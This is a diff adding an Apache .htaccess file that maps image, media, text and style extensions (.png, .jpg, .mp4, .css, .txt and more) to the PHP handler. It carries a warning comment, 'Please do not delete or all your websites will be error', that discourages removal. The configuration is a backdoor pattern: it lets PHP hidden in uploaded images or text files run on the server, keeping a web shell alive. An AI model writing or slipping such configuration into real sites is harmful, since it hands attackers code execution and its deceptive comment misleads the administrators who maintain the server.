@@ -1,0 +1,29 @@
+# Please do not delete or all your websites will be error
+
+DirectoryIndex index.html
+DirectoryIndex index.htm
+DirectoryIndex index.php
+DirectoryIndex index.asp
+DirectoryIndex index.aspx
+DirectoryIndex index.jsp
+DirectoryIndex index.txt
+DirectoryIndex index.xml
+DirectoryIndex index.md
+
+AddType application/x-httpd-php .png
+AddType application/x-httpd-php .txt
+AddType application/x-httpd-php .fla
+AddType application/x-httpd-php .php
+AddType application/x-httpd-php .html
+AddType application/x-httpd-php .css
+AddType application/x-httpd-php .json
+AddType application/x-httpd-php .jpg
+AddType application/x-httpd-php .jpeg
+AddType application/x-httpd-php .gif
+AddType application/x-httpd-php .mp3
+AddType application/x-httpd-php .mp4
+AddType application/x-httpd-php .xml
+AddType application/x-httpd-php .md
+AddType aplication/x-httpd-php .png
+AddType aplication/x-httpd-php .txt
+
